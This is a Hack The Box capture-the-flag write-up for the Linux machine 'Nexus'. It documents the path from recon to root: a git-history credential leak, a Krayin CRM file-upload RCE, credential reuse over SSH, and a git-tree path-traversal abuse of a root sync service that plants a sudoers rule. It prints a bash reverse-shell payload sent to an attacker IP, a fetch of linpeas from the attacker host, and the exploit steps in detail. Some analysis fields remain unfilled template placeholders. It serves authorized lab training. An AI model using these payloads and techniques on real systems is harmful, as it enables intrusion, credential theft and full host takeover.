Hack The Box / Easy / Linux

Nexus

This report documents an in-progress assessment of the Hack The Box machine Nexus at 10.129.234.54. It will record observed services, evidence-supported findings, security impact, and remediation. No scan output or technical validation evidence has been supplied yet.

In progress · Authorized laboratory assessment · Reviewed: 2026-09-30

Dylan Senez / D4RKGUNN3R

Case overview

Validated steps were directly reproduced. Documented steps are supported by preserved artifacts. Staged steps remain incomplete or await evidence.

Attack path

    1. Reconnaissance —

    Validated · Kali/ Attacker · EVD-001

    Artifact

    scans/Nx.nmap

    Objective

    Identify exposed TCP services on 10.129.234.54 and collect service banners and basic application information.

    Command / request

    nmap -sVC -p- 10.129.234.54 -T3 --min-rate 5000 -oA Nx

    Observed result

    22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Nexus Energy Authority \xE2\x80\x94 Powering the Nation's Future
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Analysis

    The visible scan output identifies HTTP on TCP port 80, reporting nginx 1.24.0 (Ubuntu). The page title is “Nexus Energy Authority — Powering the Nation’s Future.” Nmap also reports Linux service information. These are fingerprinting observations; they do not independently confirm the operating system or a vulnerability.

    Why this mattered

    Established the initial service inventory and identified the Nexus Energy Authority web application for further assessment.

    2. Reconnaissance — Public website review

    Validated · Kali · EVD-002

    Objective

    Review the public website for organizational details and exposed contact information.

    Command / request

    GET http://nexus.htb — opened the Careers section and the “Operations Specialist – Customer Platforms” listing.

    Observed result

    The listing displayed careers@nexus.htb as the application address and j.matthew@nexus.htb as the hiring-manager contact.

    Analysis

    The page exposes two organizational email addresses. The named contact suggests an account naming convention, but does not confirm a valid login username. Why this mattered: Established

    Why this mattered

    Established organizational context and documented publicly available identity information.

    3. Reconnaissance — HTTP Virtual-host discovery

    Validated · Kali / ffuf 2.1.0-dev · EVD-003

    Artifact

    scans/vhost.json

    Objective

    Identify additional HTTP virtual hosts by varying the Host header.

    Command / request

     ffuf -u http://nexus.htb -H "Host: FUZZ.nexus.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac -t 20 -rate 100 -of json -o scans/vhosts.json

    Observed result

    | Host header | HTTP status | Response bytes | Words | Lines |
|---|---:|---:|---:|---:|
| `billing.nexus.htb` | 302 | 390 | 60 | 12 |
| `git.nexus.htb` | 200 | 14,474 | 1,195 | 242 |

    Analysis

    ffuf reported responses for the billing and git Host header values after automatic calibration. The billing response was a redirect; its destination is not shown because redirects were not followed. The git response returned HTTP 200, but the output alone does not establish which application it serves. This was HTTP virtual-host discovery, not DNS enumeration.

    Why this mattered

    Identified two candidate application hosts beyond the main website. These observations expand the documented service inventory; neither response alone confirms a vulnerability.

    4. Reconnaissance — GRepository and configuration-history review

    Validated · Kali / Git · EVD-004

    Artifact

    Local krayin-docker-setup repository

    Objective

    : Review the repository’s configuration files and track changes to .env throughout its available history.

    Command / request

    git clone http://git.nexus.htb/admin/krayin-docker-setup.git
cd krayin-docker-setup
git log --oneline --all
git log -p --all -- .env

then inside it hit :q

    Observed result

    The .env history showed a plaintext DB_PASSWORD value being replaced with an empty value. The same commit changed APP_URL from http://nexus.htb to http://billing.nexus.htb. Visible configuration included DB_HOST=krayin-mysql, DB_DATABASE=krayin, and DB_USERNAME=krayin. The change was recorded on April 23, 2026, at 18:05:22 UTC.

    Analysis

    Removing the password from the latest file did not remove it from earlier Git history. Anyone able to retrieve this repository’s history could recover the previous value. The configuration associates the project with the billing hostname, but does not prove that the deployed application uses these exact settings or that the credential remains valid.

    Why this mattered

    Demonstrated a secret-management failure: a database credential remained accessible through version control despite being cleared from the current configuration.

    5. Initial Access — Succesful billing application

    Validated · Kali / Browser · EVD-005

    Objective

    Document the application access obtained using the discovered email address and exposed password.

    Command / request

    Signed in through the billing application’s login form using the discovered email address and recovered password. Password omitted from the report.

    Observed result

    Authentication succeeded, opening http://billing.nexus.htb/admin/dashboard. The authenticated interface displayed the Krayin dashboard, account controls, and “Version: 2.2.0” in the profile menu.

    Analysis

    The reported successful login connects the historical credential exposure to actual application access. The screenshot corroborates an authenticated session and the application’s displayed version, but does not show which credentials were submitted. The /admin/dashboard path alone does not establish unrestricted administrator privileges.

    Why this mattered

    Demonstrated concrete impact from the exposed password: access to the billing CRM through an application account

    6. Initial Access — CVE-2026-38526 File upload to webshell (www-data)

    Validated · Kali · EVD-006

    Objective

    Assess whether the identified Krayin CRM vulnerability could be used to gain access to the underlying system.

    Command / request

    Retrieved public PoC from Exploit-DB (exploit-db.com/exploits/52629), saved 
locally as `rce.py`. Created a minimal `shell.php` payload for delivery.

```bash
python3 rce.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p '<PASSWORD>' -s shell.php

curl -s "http://billing.nexus.htb/storage/tinymce/6ecc7a37470003287c2b2dfb7169ca71.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.35/4444%200%3E%261%27"

    Observed result

    Exploit executed successfully. The script uploaded shell.php via the 
identified vulnerable endpoint and triggered execution, returning a 
reverse shell connection on the listener. Confirmed code execution as 
www-data on the target host (billing.nexus.htb).

    Analysis

    The Krayin CRM instance was vulnerable to CVE-2026-38526, permitting [authenticated] remote code execution via [file upload / injection — specify the actual vector]. Using the credentials recovered in the prior step (j.matthew@nexus.htb), the exploit uploaded and triggered `shell.php`, resulting in a reverse shell as `<user>` on the host.

    Why this mattered

    Escalated from application-layer access (billing dashboard) to full code execution on the underlying system, confirming the CRM vulnerability was directly exploitable — not just a theoretical CVE match.

    7. Privilege Escalation — LinPEAS Local Enumeration

    Validated · Target — billing.nexus.htb · EVD-007

    Artifact

    linpeas.sh

    Objective

    Enumerate the compromised host for local privilege-escalation opportunities, including kernel vulnerabilities, exposed credentials, sudo permissions, SUID/SGID binaries, capabilities, services, scheduled tasks, and writable files.

    Command / request

    wget http://10.10.14.35:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

    Observed result

    LinPEAS identified five kernel vulnerability matches on kernel 6.8.0-111-generic, including CVE-2025-38236, CVE-2026-43503, CVE-2026-46331, CVE-2026-46333, and CVE-2026-43499. It also identified a potentially significant application configuration file at /var/www/krayin/.env readable by www-data. The .env file contains the Krayin MySQL database credentials and Laravel application configuration.

    Analysis

    Local enumeration revealed multiple potential privilege-escalation avenues. The kernel findings are candidate vulnerabilities based on version/configuration matching and require individual validation; they should not yet be treated as confirmed exploitable paths. More immediately, /var/www/krayin/.env is readable by the compromised www-data account and exposes application/database credentials. These credentials should be investigated for reuse against local services or other accounts.

    Why this mattered

    The enumeration moved the assessment from initial web application access to identifying potential paths for increasing privileges and expanding access. The exposed .env credentials are particularly relevant because credential reuse could provide a less intrusive escalation path than attempting a kernel exploit.

    8. User Access — Credential Reuse — SSH Access as jones

    Validated · Target — billing.nexus.htb · EVD-008

    Artifact

    /var/www/krayin/.env

    Objective

    Determine whether credentials recovered from the Krayin application configuration were reused by a local system account.

    Command / request

    ssh jones@billing.nexus.htb

    Observed result

    The password recovered from the Krayin application's .env configuration was accepted for the jones account over SSH, establishing an interactive SSH session as jones.

    Analysis

    The application/database credential was reused for a local system account. This allowed the initial www-data foothold to be upgraded to authenticated access as jones. The successful authentication confirms credential reuse as an actual attack path rather than a theoretical possibility.

    Why this mattered

    Access as jones provides a higher-privileged user context than the original www-data web-service account and enables further local enumeration for privilege escalation toward root.

    9. Privilege Escalation — Automated local enumeration (linpeas)

    Validated · Target - Jones ssh session · EVD-009

    Artifact

    linpeas.txt

    Objective

    Enumerate cron, systemd timers, services, SUID/SGID, capabilities, and kernel exposure.

    Command / request

    ./linpeas.sh 2>/dev/null | tee linpeas.txt

    Observed result

    Thu 2026-10-01 10:09:46 ... gitea-template-sync.timer  gitea-template-sync.service
  Potential privilege escalation in timer file: /etc/systemd/system/gitea-template-sync.timer
  /var/log/template-sync.log            ← readable by jones
  SUID: stock binaries only; capabilities: ping/mtr/snap-confine/gst only

    Analysis

    A custom 60-second root timer is the standout anomaly. Kernel CVE suggestions (6.8.0-111) were noted but de-prioritized: unprivileged user namespaces are disabled, removing the public PoC path for the listed items. The readable sync log offered a live telemetry channel into the root job.

    Why this mattered

    Identified the single custom privileged automation on the host and provided a monitoring channel for the eventual exploit — without needing root to see it.

    10. Privilege Escalation — Source review of `/etc/gitea/template-sync.py` (CWE-22 identification)

    Validated · Target — jones SSH session · EVD-010

    Artifact

    `/etc/gitea/template-sync.py`

    Objective

    Read the root-run service to identify exploitable logic.

    Command / request

    cat /etc/systemd/system/gitea-template-sync.service
  # User=root ; ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py ; TimeoutStartSec=50s
  cat /etc/gitea/template-sync.py

    Observed result

    GITEA_URL   = "http://localhost:3000"
  STAGING_DIR = "/home/git/template-staging"
  ...
  repos = [r for r in repos if r.get('template', False)]        # filter
  ...
  result = subprocess.run(GIT + ['ls-tree', '-r', 'HEAD'], ...) # trusts tree entries
  ...
  for mode, objhash, filepath in entries:
      target = os.path.join(stage_path, filepath)               # NO normalization
      os.makedirs(os.path.dirname(target), exist_ok=True)
      with open(target, 'wb') as f:                             # writes as ROOT
          f.write(cat_result.stdout)
      os.chmod(target, 0o644 if mode != '100755' else 0o755)

    Analysis

    `os.path.join()` does not neutralize `..` and no containment check validates that `target` stays under `stage_path`. Because `filepath` comes straight from `git ls-tree -r` output, any tree entry name becomes a root-writable path. A normal `git add` refuses `..` components — but git's object model itself does not: raw tree objects containing `..` are valid to `ls-tree`/`cat-file`. Flagging a repo as `template: true` is within a normal user's power, so the trust boundary collapses entirely. CWE-22 → arbitrary write as root. Mode handling (`0644`) is even compatible with sudoers.d requirements.

    Why this mattered

    This is the root cause of the host's total compromise: a metadata-trust failure in a root service, reachable by any authenticated Gitea user.

    11. Privilege Escalation — Fabricate git tree containing traversal path

    Validated · Target — jones session (`/tmp/pwn`) · EVD-011

    Artifact

    `/tmp/pwn/build.py` + `git ls-tree` output

    Objective

    Produce a commit whose tree contains a literal `..` directory chain resolving to `/etc/sudoers.d/pwn`.

    Command / request

    `build.py` writes raw git objects directly (hashlib+zlib, no index): a blob with payload `jones ALL=(ALL) NOPASSWD: ALL\n`, nested trees for `etc/sudoers.d`, six `..` tree entries (staging depth is 5: `/home/git/template-staging/jones/<repo>`; extra `..` clamps at `/`), then the commit object and `refs/heads/main`.

    Observed result

    [+] commit: b379e184d71cbe95fe0c8a2eba97de4fffa9325a
  $ git ls-tree -r HEAD
  100644 blob f27766ee83dd89926dfd9fffe24ea00d179e5845  README.md
  100644 blob 363212f744e242988c87a3fc0ca391bd53b2ae0b  ../../../../../../etc/sudoers.d/pwn

    Analysis

    `ls-tree -r` — the exact input the root service parses — emits the traversal path verbatim, proving the malicious metadata survives every layer the sync will exercise.

    Why this mattered

    This is the exploit's core primitive: attacker-influenced path names inside a valid git object stream, invisible to normal git workflows and unvalidated by the consumer.

    12. Privilege Escalation — Register template-flagged repo and push payload

    Validated · Target — jones session, Gitea API on localhost:3000 · EVD-012

    Artifact

    api_calls.log

    Objective

    Create the repo the sync will consume and deliver the malicious tree.

    Command / request

    curl -s -w '\nHTTP %{http_code}\n' -u 'jones:<pw>' -X POST \
    http://localhost:3000/api/v1/user/repos \
    -H 'Content-Type: application/json' \
    -d '{"name":"pwn","auto_init":false,"template":true,"private":false}'
  curl -s -u 'jones:<pw>' http://localhost:3000/api/v1/repos/jones/pwn \
    | python3 -c 'import sys,json; print(json.load(sys.stdin).get("template"))'
  git remote add origin 'http://jones:<pw>@localhost:3000/jones/pwn.git'
  git push -u origin main --force

    Observed result

    Repo creation `HTTP 201`; verification prints `template = True`; push accepted 13 objects, `* [new branch] main -> main`.

    Analysis

    Two operational findings: (1) the hostname `git.nexus.htb` does not resolve on-host (no working DNS; `/etc/hosts` lacks it) — the Gitea service is reachable at `127.0.0.1:3000`, matching the sync script's `GITEA_URL`; (2) the `template` flag is the sync's entire selector and is user-controllable. Password containing `!!` must be single-quoted to survive bash history expansion.

    Why this mattered

    Closed the delivery gap — the payload now sits in the bare repo (`/var/lib/gitea/data/gitea-repositories/jones/pwn.git`) that the root timer reads every 60 seconds.

    13. Privilege Escalation — sudo execution and root flag capture

    Validated · Target — jones → root · EVD-013

    Objective

    Convert the sudoers write into a root shell and capture the flag.

    Command / request

    jones@nexus:/tmp/pwn$ sudo -n id
  jones@nexus:/tmp/pwn$ sudo /bin/bash
  root@nexus:/tmp/pwn# cd /root
  root@nexus:/root# cat root.txt

    Observed result

    uid=0(root) gid=0(root) groups=0(root)
root flag <REDACTED>

    Analysis

    `sudo -n` succeeding without a password proves the dropped rule is live and parsed. Full root achieved without any kernel exploit — entirely through service logic abuse and credential reuse.

    Why this mattered

    Terminal objective. Demonstrates end-to-end impact: public web app → web-tier RCE → secret reuse → authenticated user → privileged automation abuse → root.
